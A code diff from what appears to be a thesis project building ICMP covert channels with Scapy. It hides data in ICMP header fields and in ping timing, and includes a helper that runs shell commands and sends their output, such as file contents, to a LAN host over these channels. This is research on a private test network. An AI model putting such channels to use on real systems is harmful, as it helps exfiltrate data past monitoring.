@@ -1,8 +1,13 @@
-import datetime, ipaddress
+from mymethods import *  
+from scapy.all import *
+from attacksingleton  import *
+import datetime, ipaddress 
+import re 
+import time 
 
 data="echo 'Ciao'".encode() 
 
-def test_1():
+def test_printTimestamp():
     for index in range(0, len(data), 5): 
         try:
             icmp_id=(data[index]<<8)+data[index+1]  
@@ -52,29 +57,17 @@ def test_1():
         print(f"Data pkt: {data_pkt}")
         print(f"Timestamp: {icmp_ts_tx}")
 
-def test_2():
-    for index in range(0, len(data), 12): 
-        print(f"Byte data: {int.from_bytes(data[index:index+4])}")
-        print(f"Byte data: {int.from_bytes(data[index+5:index+8])}") 
-        print(f"Byte data: {int.from_bytes(data[index+8:index+12])}") 
-
-from mymethods import IP_INTERFACE as ipinterface 
-from mymethods import IS_TYPE as istype, ping_once, IP_INTERFACE as ipinterface, THREADING_EVENT as threadevent 
-from mymethods import TIMER as mytimer, GET as get, SNIFFER as mysniffer, is_scelta_SI_NO, print_dictionary 
-from scapy.all import *
-ip_address, errore=ipinterface.find_local_IP() 
-
-def func3():
+def test_decodeData_fromPackets():
     packet_list=[]
     data="echo 'Ciao'".encode()
     ip_dst=ipaddress.ip_address("192.168.1.17")
     def ipv4_destination_unreachable(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
-            if not istype.bytes(data) or not istype.ipaddress(ip_dst):
-                raise Exception(f"Argoemnti non corretti")
+            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
+                raise Exception(f"test_decodeData_fromPackets: Argoemnti non corretti")
             if ip_dst.version!=4:
                 print(f"IP version is not 4: {ip_dst.version}")
                 return False
-            interface,_=ipinterface.iface_from_IP(ip_dst) 
+            interface=IP_INTERFACE.iface_from_IP(ip_dst) 
             TYPE_DESTINATION_UNREACHABLE=3 
             ip_dst=ipaddress.ip_address("192.168.1.17")
             for index in range(0, len(data), 8):
@@ -127,110 +120,12 @@ def func3():
                 #print("AAAA")
                 #print(decoded_data)
             #elif pkt[ICMP].type==TYPE_DESTINATION_UNREACHABLE and not inner_ip.haslayer(IP): #packet.haslayer(Padding):
-                #threadevent.set(event_pktconn)
+                #THREADING_EVENT.set(event_pktconn)
                 #exit(0)
                 #print("Pacchetto non ha livello IP error\t",pkt)
     print(decoded_data)
 
-target_ip="192.168.1.17"
-port=None
-data="Dato mandato da computer di Marco"
-ttl=64
-icmp_id=12345 
-
-def calculate_checksum(data):
-    checksum = 0 
-    # Handle odd-length data
-    if len(data) % 2 != 0:
-        data += b"\x00" 
-    # Calculate checksum
-    for i in range(0, len(data), 2):
-        checksum += (data[i] << 8) + data[i+1] 
-    checksum = (checksum >> 16) + (checksum & 0xffff)
-    checksum += checksum >> 16 
-    return (~checksum) & 0xffff
-
-def send_icmp_packet():
-    icmp_type = 8  # ICMP echo request
-    icmp_code = 0
-    icmp_checksum = 0
-    icmp_sequence = 1
-    if data:
-        icmp_payload = data.encode()
-    else:
-        icmp_payload = b"Hello, World!"
-    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)
-    icmp_checksum = calculate_checksum(icmp_header + icmp_payload)
-    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(icmp_checksum), icmp_id, icmp_sequence)
-    icmp_packet = icmp_header + icmp_payload 
-    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, struct.pack("I", ttl)) 
-        sock.settimeout(2)
-        if port:
-            sock.sendto(icmp_packet, (target_ip, port))
-        else:
-            sock.sendto(icmp_packet, (target_ip, 0))
-        print("ICMP packet sent successfully!")
-#IPPROTO_ICMP 1
-#IPPROTO_ICMPV6 58
-#IPPROTO_IPV4 4
-#IPPROTO_IPV6 41
-#IPPROTO_TCP 6
-#IPPROTO_UDP 17
-
-from mymethods import IP_INTERFACE
-from scapy.all import *
-from attacksingleton  import *
-
-def ipv4_destination_unreachable(data:bytes=None, ip_dst:ipaddress.IPv4Address=None):  
-        if not (istype.bytes(data) and istype.ipaddress(ip_dst)):
-            raise Exception(f"Argomenti non corretti")
-        if ip_dst.version!=4:
-            print(f"IP version is not 4: {ip_dst.version}")
-            return False
-        interface,_=ipinterface.iface_from_IP(ip_dst) 
-        print(f"Interfaccia per destinazione: {interface}")
-        TYPE_DESTINATION_UNREACHABLE=3 
-        for index in range(0, len(data), 8):
-            dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
-                ICMP(id=int.from_bytes(data[index+6:index+8]))
-            pkt= Ether(dst=ipinterface.get_macAddress(ip_dst).replace("-",":").lower())/\
-                IP(dst=ip_dst.compressed)/\
-                ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3, unused=int.from_bytes(data[index:index+4]) )/\
-                Raw(load=bytes(dummy_ip)[:28]) 
-            print(f"Data: {data[index:index+4]}\t{int.from_bytes(data[index:index+4])}")
-            print(f"Data: {data[index+4:index+6]}\t{int.from_bytes(data[index+4:index+6])}") 
-            print(f"Data: {data[index+6:index+8]}\t{int.from_bytes(data[index+6:index+8])}") 
-            #print(f"Sending {pkt.summary()}") 
-            pkt.show()
-            sendp(pkt, verbose=1, iface=interface)  if pkt else print("Pacchetto non presente")
-        dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8") / ICMP(id=0,seq=1)
-        pkt= Ether(dst=ipinterface.get_macAddress(ip_dst).replace("-",":").lower())/\
-            IP(dst=ip_dst.compressed)/\
-            ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3)/\
-            Raw(load=bytes(dummy_ip)[:28])
-        #pkt.show()
-        print(f"interface: {interface}")
-        sendp(pkt, verbose=1, iface=interface) 
-
-
-def test_send():
-    target_mac = "24:77:03:18:7b:74"    # quello visto in Wireshark
-    dst="192.168.1.17"
-    iface = "Ethernet"  # nome esatto dell’interfaccia in Scapy
-
-    ip_dst=ipaddress.ip_address("192.168.1.17")
-    target_mac = ipinterface.get_macAddress(ip_dst).strip().replace("-",":").lower()
-    print("MAC destinazione: ", target_mac)
-    interface=IP_INTERFACE.iface_from_IP(ip_dst) 
-    print("Interfaccia:", interface)
-    pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP()/Raw(b"test 3456")
-    ans=srp1(pkt, iface=interface, verbose=1)
-    if ans:
-        print("Risposta ricevuta:")
-        ans.show() 
-
-def make_1000_ciao():
+def write_1000_ciao():
     with open("1000_ciao.txt", "w",encoding="utf-8") as file:
         print( [hex(ord(caracter)) for caracter in "Ciao"])
         print(''.join(hex(ord(char)) for char in "Ciao"))
@@ -238,7 +133,7 @@ def make_1000_ciao():
             file.write("Ciao"*i)
             #file.write("\n")
 
-def make_100_banana():
+def write_100_banana():
     with open("100_banana.txt", "w",encoding="utf-8") as file:
         print( [hex(ord(caracter)) for caracter in "Banana"])
         print(''.join(hex(ord(char)) for char in "Banana"))
@@ -246,7 +141,7 @@ def make_100_banana():
             file.write("Banana"*i)
             #file.write("\n")
 
-def read_100_ciao():
+def read_100_ciao_hex():
     with open("100_ciao.txt", "r",encoding="utf-8") as file: 
         for chunk in iter(lambda: file.read(16), ''):
             print( chunk.encode('utf-8').hex() ) 
@@ -273,53 +168,65 @@ def read_files():
             x+=length
         print(x)
 
-def test_ReceiveSingleton():
-    final_data=[]
-    ip_dst=ipaddress.ip_address("192.168.1.3")
-    ip_src=ipaddress.ip_address("192.168.1.17")
-    ReceiveSingleton.ipv4_timestamp_request(ip_dst, final_data, ip_src)
-    print("Dati ricevuti: ", final_data)
+def send_receive_Singleton():
+    def test_ReceiveSingleton():
+        final_data=[]
+        ip_dst=ipaddress.ip_address("192.168.1.3")
+        ip_src=ipaddress.ip_address("192.168.1.17")
+        ReceiveSingleton.ipv4_timestamp_request(ip_dst, final_data, ip_src)
+        print("Dati ricevuti: ", final_data) 
 
+    def test_SendSingleton(data:bytes=None):
+        if not data or not IS_TYPE.bytes(data):
+            data="Dato mandato da computer di Marco".encode()
+        ip_dst=ipaddress.ip_address("192.168.1.17")
+        SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
+        #ipv4_timestamp_reply warnings MAC address 
 
-data="echo 'Ciao'".encode()
-def test_timing_channel8bit():
-    current_time=datetime.datetime.now()
-    old_time=datetime.datetime.now()
-    min_sec_delay=1 #originale 0
-    max_sec_delay=25 #originale 255
-    for index in data: 
-        current_time=datetime.datetime.now()
-        print(f"Current time: {current_time}")
+#-----------------------------------------------
+def esegui_comando(comando): 
+    print(comando)
+    cwd = r"D:\Tesi Magistrale\implementazione\unione\scelta_type"
+    try:
+        # Esegui il comando e cattura output e errori
+        risultato = subprocess.run(
+            comando
+            ,shell=True, check=True 
+            ,stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            #,cwd=cwd
+        )
+        codifiche=["utf-8", "cp1252", "cp850", "cp437"] #Windows chcp da la codifca sistema ->cp{val_preso}
+        index_codifiche=0
+        while True:
+            try: 
+                stderr=risultato.stderr.decode(codifiche[index_codifiche], errors="replace") 
+                stdout=risultato.stdout.decode(codifiche[index_codifiche], errors="replace")
+                print("Err", stderr)
+                print("Out", stdout)
+                if stderr:
+                    stdout += "\n[Errore]\n" + stderr
+                return stdout 
+            except UnicodeDecodeError as e: 
+                if index_codifiche>=len(codifiche): 
+                    raise Exception("esegui_comando: Codifica testo sconosciuta")
+                index_codifiche+=1
+    except subprocess.CalledProcessError as e: 
+        stderr = e.stderr.decode("utf-8", errors="replace") if e.stderr else str(e)
+        return f"Errore durante l'esecuzione del comando:\n{stderr}" 
 
-        delay=min_sec_delay+(index/255)*(max_sec_delay-min_sec_delay)
-        print(f"Delay :{index}\t{delay}\t{delay.total_seconds()}\n")
-        #print(f"Data: {index}\t{index-31}\t{type(index)}\n") 
-        time.sleep(delay)
+# Esempio di utilizzo
+#comando = "echo Ciao Mondo" 
+#comando=r"cd 'D:\Tesi Magistrale\implementazione\unione\scelta_type' & dir" #"cd 'D:\\Tesi Magistrale\\implementazione\\unione\\scelta_type'; ls"
+#comando=r"type _get_over_you.txt" 
+#comando=r"type 100_ciao.txt" 
+#comando=r"type 100_banana.txt" 
+#comando=r"type 1000_ciao.txt"
+#output = esegui_comando(comando)
+#print(output) 
+#test_SendSingleton(output.encode()) 
 
-        old_time=current_time
-        current_time=datetime.datetime.now()
-        print(f"Current time: {current_time}")
-        print(f"Time difference: {current_time-old_time}\t{(current_time-old_time).total_seconds()}\n") 
-
-
-def test_bit():
-    codice_bit={}
-    lista_codici=[
-        30,31,32,33,34,35 #destination unreachable
-        ,110,111 #time exceeded
-        ,120 #parameter problem
-        ,40 #source quench
-        ,50,51,52,53 #redirect
-        ,80#, 0 #echo request/reply
-        ,130#, 140 #timestamp request/reply
-        ,150#, 160 #info request/reply
-    ]
-
-    for index in range(0,len(lista_codici)):
-        print("Coppia:\t",index, lista_codici[index])
-        codice_bit.update({lista_codici[index]:index})
-    print(codice_bit)
-
+def test_1st_last_4bit(): 
+    #return primi_4, ultimi_4
     data="echo 'Ciao'".encode()
     for index in data:
         print("Index:", index, bin(index))
@@ -327,9 +234,19 @@ def test_bit():
         print("Ultimi 4 bit:", index& 0b00001111)
         print("")  
 
-def get_codice_bit():
-    codice_bit={}
-    lista_codici=[
+#-----------------------------------------------
+def get_1st_last_4bit(numero:int):
+    #Da un byte ricava i primi 4 bit e gli ultimi 4 bit 
+    if not IS_TYPE.integer(numero):
+        raise Exception("get_1st_last_4bit:Argomento non valido")
+    primi_4=(numero& 0b11110000)>>4
+    ultimi_4=numero& 0b00001111 
+    return primi_4, ultimi_4 
+
+
+def get_lista_codici(): 
+    #Lista degli interi tipologia+codice
+    return [
         30,31,32,33,34,35 #destination unreachable
         ,110,111 #time exceeded
         ,120 #parameter problem
@@ -339,68 +256,204 @@ def get_codice_bit():
         ,130#, 140 #timestamp request/reply
         ,150#, 160 #info request/reply
     ]
+
+
+def get_codice_bit():
+    #Ritorna il dizionario in cui si associa ad un codice  (con codice=tipologia+coddice ICMP) l'intero associato 
+    codice_bit={}
+    lista_codici=get_lista_codici()
+    #Associo ad ogni intero da 0 sino a 16 il proprio messaggio ICMP
     for index in range(0,len(lista_codici)):
-        print("Coppia:\t",index, lista_codici[index])
+        #print("Coppia:\t",index, lista_codici[index])
         codice_bit.update({lista_codici[index]:index})
     return codice_bit 
 
-def get_tipologia_codice(stringa:str=None):
-    if not stringa or not istype.stringa(stringa):
-        raise Exception("Argomento non corretto")
-    if len(stringa)>3 or len(stringa)<2:
-        raise Exception(f"Lunghezza nonvalida {stringa}")
-    print("Stringa passata:", stringa)
-    codice= stringa.lower().strip()[:1:-1]
-    tipologia= stringa.lower().strip()[:len(stringa)-1] 
+def get_bit_codice():
+    #Ritorna il dizionario in cui si associa a un intero il codice associato (con codice=tipologia+coddice ICMP)
+    bit_codice={}
+    lista_codici=get_lista_codici()
+    #Associo ad ogni intero da 0 sino a 16 il proprio messaggio ICMP
+    for index in range(0,len(lista_codici)):
+        #print("Coppia:\t",index, lista_codici[index])
+        bit_codice.update({index:lista_codici[index]})
+    return bit_codice 
+
+
+def get_tipologia_codice_str(stringa:str=None): 
+    #Data una stringa ritorna la tipologia di messaggio ICMP e il codice relativo
+    if not IS_TYPE.string(stringa):
+        print("Argomento non corretto") 
+        return None,None
+    if not re.match(r"^[0-9]{2,3}$",stringa): 
+        print(f"Stringa non valida {stringa}")  
+        return None,None
+    lista_codici=get_lista_codici() 
+    if int(stringa) not in lista_codici: 
+        print(f"Codice stringa non valido: {stringa}")
+        return None,None
+    print("Stringa passata:", stringa) 
+    codice= stringa.lower().strip()[-1]
+    tipologia= stringa.lower().strip()[:-1] 
+    print("Codice:", codice, "Tipologia:", tipologia)
+    return tipologia, codice 
+
+def get_tipologia_codice_int(numero:int=None): 
+    #Dato un intero ritorna la tipologia di messaggio ICMP e il codice relativo
+    if not IS_TYPE.integer(numero):
+        print("Argomento non corretto") 
+        return None,None 
+    lista_codici=get_lista_codici() 
+    if numero not in lista_codici: 
+        print(f"Codice non valido: {numero}")
+        return None,None
+    print("Codice passato:", numero) 
+    codice= numero%10
+    tipologia= numero//10
     print("Codice:", codice, "Tipologia:", tipologia)
     return tipologia, codice
 
+
 def get_tipologia_byte(): 
+    #Ritorna un dizionario in cui si associa ad una tipologi di messaggio ICMP i byte trasportabili
     return {
-        "15":2, "16":2 #information
-        ,"13":5,"14":5 #timestamp
-        ,"8":2, "0":2 #echo
-        ,"5":4 #redirect
-        ,"4":8 #quench
-        ,"12":7 #problem
-        ,"11":6 #time_exceeded
-        ,"3":8 #destination_unreachable
+        15:2, 16:2 #information
+        ,13:5,14:5 #timestamp
+        ,8:2, 0:2 #echo
+        ,5:4 #redirect
+        ,4:8 #quench
+        ,12:7 #problem
+        ,11:6 #time_exceeded
+        ,3:8 #destination_unreachable
     }
 
-def send_data(tipologia:str=None, data:str=None, ip_dst:ipaddress=None): 
-    if not(istype.string(tipologia) and istype.string(data) and istype.ipaddress(ip_dst)): 
-        raise Exception("Argomenti non corretti") 
+def send_data(tipologia:int=None, data:str=None, ip_dst:ipaddress=None): 
+    if not(IS_TYPE.integer(tipologia) and IS_TYPE.string(data) and IS_TYPE.ipaddress(ip_dst)): 
+        raise Exception("send_data: Argomenti non corretti") 
     data=data.encode() 
     match tipologia: 
-        case "15": print("ipv4_information_reply")
-        case "16": print("ipv4_information_reply")
-        case "13": print("ipv4_timestamp_reply")
-        case "14": print("ipv4_timestamp_reply")
-        case "8": print("ipv4_echo_reply")
-        case "0": print("ipv4_echo_reply")
-        case "5": print("ipv4_redirect")
-        case "4": print("ipv4_source_quench")
-        case "12": print("ipv4_parameter_problem")
-        case "11": print("ipv4_time_exceeded")
-        case "3": print("ipv4_destination_unreachable")
+        case 15: print("ipv4_information_reply")
+        case 16: print("ipv4_information_reply")
+        case 13: print("ipv4_timestamp_reply")
+        case 14: print("ipv4_timestamp_reply")
+        case 8: print("ipv4_echo_reply")
+        case 0: print("ipv4_echo_reply")
+        case 5: print("ipv4_redirect")
+        case 4: print("ipv4_source_quench")
+        case 12: print("ipv4_parameter_problem")
+        case 11: print("ipv4_time_exceeded")
+        case 3: print("ipv4_destination_unreachable")
     return
     match tipologia: 
-        case "15": SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst)  
-        case "16": SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
-        case "13": SendSingleton.ipv4_timestamp_reply(data=data, ip_dst=ip_dst) 
-        case "14": SendSingleton.ipv4_timestamp_reply(data=data, ip_dst=ip_dst) 
-        case "8": SendSingleton.ipv4_echo_reply(data=data, ip_dst=ip_dst) 
-        case "0": SendSingleton.ipv4_echo_reply(data=data, ip_dst=ip_dst) 
-        case "5": SendSingleton.ipv4_redirect(data=data, ip_dst=ip_dst) 
-        case "4": SendSingleton.ipv4_source_quench(data=data, ip_dst=ip_dst) 
-        case "12": SendSingleton.ipv4_parameter_problem(data=data, ip_dst=ip_dst) 
-        case "11": SendSingleton.ipv4_time_exceeded(data=data, ip_dst=ip_dst) 
-        case "3": SendSingleton.ipv4_destination_unreachable(data=data, ip_dst=ip_dst) 
+        case 15: SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst)  
+        case 16: SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
+        case 13: SendSingleton.ipv4_timestamp_reply(data=data, ip_dst=ip_dst) 
+        case 14: SendSingleton.ipv4_timestamp_reply(data=data, ip_dst=ip_dst) 
+        case 8: SendSingleton.ipv4_echo_reply(data=data, ip_dst=ip_dst) 
+        case 0: SendSingleton.ipv4_echo_reply(data=data, ip_dst=ip_dst) 
+        case 5: SendSingleton.ipv4_redirect(data=data, ip_dst=ip_dst) 
+        case 4: SendSingleton.ipv4_source_quench(data=data, ip_dst=ip_dst) 
+        case 12: SendSingleton.ipv4_parameter_problem(data=data, ip_dst=ip_dst) 
+        case 11: SendSingleton.ipv4_time_exceeded(data=data, ip_dst=ip_dst) 
+        case 3: SendSingleton.ipv4_destination_unreachable(data=data, ip_dst=ip_dst) 
 
+
+
+def test_timing_channel8bit(data:bytes=None, ip_dst:ipaddress=None, stop_value: int = 255): 
+    if not (IS_TYPE.ipaddress(ip_dst)):
+        raise Exception("test_timing_channel8bit: Argomenti non validi") 
+    if not IS_TYPE.bytes(data): 
+        data="echo 'Ciao'".encode()
+    #old_time=current_time=datetime.datetime.now()
+    old_time=current_time=time.perf_counter()
+    min_sec_delay=1 #originale 0
+    max_sec_delay=30 #originale 255
+
+    target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
+    interface=IP_INTERFACE.iface_from_IP(ip_dst)
+
+    pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
+    sendp(pkt, verbose=1, iface=interface)
+    for byte in data: 
+        current_time=time.perf_counter()
+        print(f"Current time: {current_time}")
+
+        delay=min_sec_delay+(byte/255)*(max_sec_delay-min_sec_delay)
+        print(f"Delay :{byte}\t{delay}\n")
+        #print(f"Data: {byte}\t{byte-31}\t{type(byte)}\n") 
+        time.sleep(delay) 
+         
+        print(f"Interfaccia per destinazione: {interface}")
+        pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
+        print(f"Sending {pkt.summary()}") 
+        sendp(pkt, verbose=1, iface=interface)
+
+        old_time=current_time 
+        current_time=time.perf_counter()
+        print(f"Current time: {current_time}")
+        print(f"Time difference: {current_time-old_time}\n") 
+    stop_delay = min_sec_delay + (stop_value / 255) * (max_sec_delay - min_sec_delay)
+    print(f"[STOP] Inviando byte di stop {stop_value} dopo {stop_delay}") 
+    time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
+    pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
+    print(f"Sending {pkt.summary()}") 
+    sendp(pkt, verbose=1, iface=interface)
+
+data="Dato mandato dal computer di Marco per testare un timing channel a 8 bit".encode()
+ip_dst=ipaddress.ip_address("192.168.1.17") 
+test_timing_channel8bit(data, ip_dst)
+
+def test_receive_timing_channel8bit(ip_dst:ipaddress=None, stop_value=255): 
+    if not(istype.ipaddress(ip_dst)): 
+        raise Exception("Argomenti non validi")
+    min_sec_delay=1 #originale 0
+    max_sec_delay=30 #originale 255
+    previous_time=None 
+    stop_flag={"value":False}
+    start_time=end_time=None
+    received_data=[]
+
+    def decode_byte(delay):
+        #(byte/255)=(delay-min_sec_delay)/(max_sec_delay-min_sec_delay)
+        ratio = (delay - min_sec_delay) / (max_sec_delay - min_sec_delay)
+        byte=int(round(ratio*255)) 
+        return byte 
+    
+    def callback_timing_channel8bit(pkt):
+        nonlocal previous_time, start_time, end_time 
+        if ICMP in pkt and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
+            #current_time=datetime.datetime.now() 
+            current_time=time.perf_counter()
+            if previous_time is not None: 
+                delta=(current_time-previous_time).total_seconds() 
+                byte=decode_byte(delta) 
+                print(f"Delta:{delta} -> Byte:{byte} Char:{chr(byte)}") 
+                received_data.append(chr(byte)) 
+                if byte==stop_value:
+                    stop_flag["value"]=True
+                    end_time=pkt.time
+            else: start_time=pkt.time
+            previous_time=current_time 
+    
+    def stop_filter(pkt): 
+        return stop_flag["value"]
+    
+    print("In ascolto dei pacchetti ICMP...")
+    sniff(
+        filter=f"icmp and dst host {ip_dst.compressed}"
+        ,prn=callback_timing_channel8bit
+        ,store=False
+        ,stop_filter=stop_filter
+    ) 
+    print(f"Dati ricevuti: {received_data}") 
+    received_data="".join(x for x in received_data)
+    print(f"Dati ricevuti: {received_data}")
+    print(f"Tempo di esecuzione: {end_time-start_time}")
+
+#test_receive_timing_channel8bit(ip_dst)
 
 def test_hybrid_channel(message:bytes=None):
-    if not message or not istype.bytes(message):
-        raise Exception("Argomento non corretto")
+    if not message or not IS_TYPE.bytes(message):
+        raise Exception("test_hybrid_channel: Argomento non corretto")
     min_sec_delay=1 #originale 0
     max_sec_delay=25 #originale 255
     codice_bit=get_codice_bit()
@@ -448,66 +501,17 @@ def test_hybrid_channel(message:bytes=None):
 
 
 
-def test_SendSingleton(data:bytes=None):
-    if not data or not istype.bytes(data):
-        data="Dato mandato da computer di Marco".encode()
-    ip_dst=ipaddress.ip_address("192.168.1.17")
-    SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
-    #ipv4_timestamp_reply warnings MAC address 
-
-def send_files(): 
-    with open("100_ciao.txt", "r",encoding="utf-8") as file: 
-        for line in file.readlines():
-            print(line)
-            test_SendSingleton(line.encode())
 
 
 
-#test_ReceiveSingleton()
-#final_attemp() 
-
-def exec_command():
-    test_SendSingleton()  
 
 
-def esegui_comando(comando): 
-    print(comando)
-    cwd = r"D:\Tesi Magistrale\implementazione\unione\scelta_type"
-    try:
-        # Esegui il comando e cattura output e errori
-        risultato = subprocess.run(
-            comando
-            ,shell=True, check=True 
-            ,stdout=subprocess.PIPE, stderr=subprocess.PIPE
-            #,cwd=cwd
-        )
-        codifiche=["utf-8", "cp1252", "cp850", "cp437"] #Windows chcp da la codifca sistema ->cp{val_preso}
-        index_codifiche=0
-        while True:
-            try: 
-                stderr=risultato.stderr.decode(codifiche[index_codifiche], errors="replace") 
-                stdout=risultato.stdout.decode(codifiche[index_codifiche], errors="replace")
-                print("Err", stderr)
-                print("Out", stdout)
-                if stderr:
-                    stdout += "\n[Errore]\n" + stderr
-                return stdout 
-            except UnicodeDecodeError as e: 
-                if index_codifiche>=len(codifiche): 
-                    raise Exception("Codifica testo sconosciuta")
-                index_codifiche+=1
-    except subprocess.CalledProcessError as e: 
-        stderr = e.stderr.decode("utf-8", errors="replace") if e.stderr else str(e)
-        return f"Errore durante l'esecuzione del comando:\n{stderr}" 
 
-# Esempio di utilizzo
-comando = "echo Ciao Mondo" 
-comando=r"cd 'D:\Tesi Magistrale\implementazione\unione\scelta_type' & dir" #"cd 'D:\\Tesi Magistrale\\implementazione\\unione\\scelta_type'; ls"
-comando=r"type _get_over_you.txt" 
-#comando=r"type 100_ciao.txt" 
-#comando=r"type 100_banana.txt" 
-#comando=r"type 1000_ciao.txt"
-output = esegui_comando(comando)
-print(output) 
-test_SendSingleton(output.encode()) 
+
+
+
+
+
+
+
 
